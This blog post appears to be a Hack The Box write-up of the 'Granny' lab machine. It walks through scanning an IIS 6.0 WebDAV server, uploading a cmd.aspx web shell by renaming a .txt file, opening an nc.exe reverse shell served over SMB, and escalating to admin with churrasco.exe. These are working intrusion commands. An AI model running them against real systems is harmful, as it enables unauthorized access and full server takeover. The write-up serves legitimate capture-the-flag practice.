---
layout: post
title: HTB Machine - Granny
subtitle: Writeup
cover-img: https://www.hackthebox.com/storage/avatars/e8a122e2d713a4fb4a180bb9ccd20248.png
thumbnail-img: https://www.hackthebox.com/storage/avatars/e8a122e2d713a4fb4a180bb9ccd20248.png
share-img: https://www.hackthebox.com/storage/avatars/e8a122e2d713a4fb4a180bb9ccd20248.png
tags: [ HTB, Hack the Box,WebDav,ASP,IIS,Web,Vulnerability Assessment,Outdated Software,Reconnaissance,Arbitrary File Upload,Misconfiguration,Metasploit]
---
scans:
```zsh
sudo nmap -sS --min-rate 5000 10.10.10.15 -n -Pn -p- -oG ./nmap/allports
sudo nmap -sCV -oN ./nmap/targeted -p80 10.10.10.15
whatweb http://10.10.10.15
http://10.10.10.15 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/6.0], IP[10.10.10.15], Microsoft-IIS[6.0][Under Construction], MicrosoftOfficeWebServer[5.0_Pub], UncommonHeaders[microsoftofficewebserver], X-Powered-By[ASP.NET]
```
we have a windows machine, with IIS webservice and WebDAV that is the only port open. WebDAV is a set of extensions that allows user agents to edit contents directly in an HTTP web server. We can test what the server accepts for us to put in it with davtest.
```zsh
davtest -url http://10.10.10.15
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.10.10.15
********************************************************
NOTE	Random string for this session: k1mwRdXkGzG
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://10.10.10.15/DavTestDir_k1mwRdXkGzG
********************************************************
 Sending test files
PUT	aspx	FAIL
PUT	cfm	SUCCEED:	http://10.10.10.15/DavTestDir_k1mwRdXkGzG/davtest_k1mwRdXkGzG.cfm
PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_k1mwRdXkGzG/davtest_k1mwRdXkGzG.txt
PUT	jhtml	SUCCEED:	http://10.10.10.15/DavTestDir_k1mwRdXkGzG/davtest_k1mwRdXkGzG.jhtml
PUT	php	SUCCEED:	http://10.10.10.15/DavTestDir_k1mwRdXkGzG/davtest_k1mwRdXkGzG.php
PUT	cgi	FAIL
PUT	pl	SUCCEED:	http://10.10.10.15/DavTestDir_k1mwRdXkGzG/davtest_k1mwRdXkGzG.pl
PUT	jsp	SUCCEED:	http://10.10.10.15/DavTestDir_k1mwRdXkGzG/davtest_k1mwRdXkGzG.jsp
PUT	shtml	FAIL
PUT	asp	FAIL
PUT	html	SUCCEED:	http://10.10.10.15/DavTestDir_k1mwRdXkGzG/davtest_k1mwRdXkGzG.html
********************************************************
 Checking for test file execution
EXEC	cfm	FAIL
EXEC	txt	SUCCEED:	http://10.10.10.15/DavTestDir_k1mwRdXkGzG/davtest_k1mwRdXkGzG.txt
EXEC	txt	FAIL
EXEC	jhtml	FAIL
EXEC	php	FAIL
EXEC	pl	FAIL
EXEC	jsp	FAIL
EXEC	html	SUCCEED:	http://10.10.10.15/DavTestDir_k1mwRdXkGzG/davtest_k1mwRdXkGzG.html
EXEC	html	FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_k1mwRdXkGzG
PUT File: http://10.10.10.15/DavTestDir_k1mwRdXkGzG/davtest_k1mwRdXkGzG.cfm
PUT File: http://10.10.10.15/DavTestDir_k1mwRdXkGzG/davtest_k1mwRdXkGzG.txt
PUT File: http://10.10.10.15/DavTestDir_k1mwRdXkGzG/davtest_k1mwRdXkGzG.jhtml
PUT File: http://10.10.10.15/DavTestDir_k1mwRdXkGzG/davtest_k1mwRdXkGzG.php
PUT File: http://10.10.10.15/DavTestDir_k1mwRdXkGzG/davtest_k1mwRdXkGzG.pl
PUT File: http://10.10.10.15/DavTestDir_k1mwRdXkGzG/davtest_k1mwRdXkGzG.jsp
PUT File: http://10.10.10.15/DavTestDir_k1mwRdXkGzG/davtest_k1mwRdXkGzG.html
Executes: http://10.10.10.15/DavTestDir_k1mwRdXkGzG/davtest_k1mwRdXkGzG.txt
Executes: http://10.10.10.15/DavTestDir_k1mwRdXkGzG/davtest_k1mwRdXkGzG.html
```
The best is if we would be able to place an aspx file that the server can interpret but it is not possible to upload this type of file as we will get an error when trying to do so. But we can upload a text file and then 'move' or rename the extension. We are going to use curl to upload the txt and also then to move or rename it. 
```zsh
locate cmd | grep .aspx
/usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx

curl -s -T cmd.txt "http://10.10.10.15/cmd.txt"

curl -X MOVE --header 'Destination:http://10.10.10.15/cmd.aspx' 'http://10.10.10.15/cmd.txt'
```
now that we have a webpage that can interpret our commands we will share a nc via smb and use the webpage to pull it and execute a revere shell.
```zsh 
sudo rlwrap nc -nlvp 443

impacket-smbserver smbFolder $(pwd) -smb2support

\\10.10.14.3\smbFolder\nc.exe -e cmd 10.10.14.3 449
```
once in, we have no rights no check any of the folders of interest meaning that we have to scalate our privileges. We have the SeImpersonatePrivilege so juicy potato is an option here. However due to the fact that this is an old windows the exploit wont work.
```zsh
systeminfo
Host Name:                 GRANNY
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
```

if we google for 'windows server 2003 juicy potato privilege escalation' a blog comes with a solution, we donwload the file from the github repo and share via smb folder.

[Juicy Potato Blog](https://binaryregion.wordpress.com/2021/06/14/privilege-escalation-windows-juicypotato-exe/)

[Churrasco blog](https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/)

[Churrasco github](https://github.com/Re4son/Churrasco/raw/master/churrasco.exe)

Now we can create a folder in our target where we will download the exe. By executing it we see it has admin privileges; so we are going to launch another reverse shell session but this time it will have admin privileges.

```zsh
copy \\10.10.14.3\smbFolder\churrasco.exe churrasco.exe

churrasco.exe "whoami"

sudo rlwrap nc -nlvp 449

churrasco.exe "\\10.10.14.3\smbFolder\nc.exe -e cmd 10.10.14.3 449"
```
from there we have gained admin privileges and we can retrieve the flag from both user and admin folders.
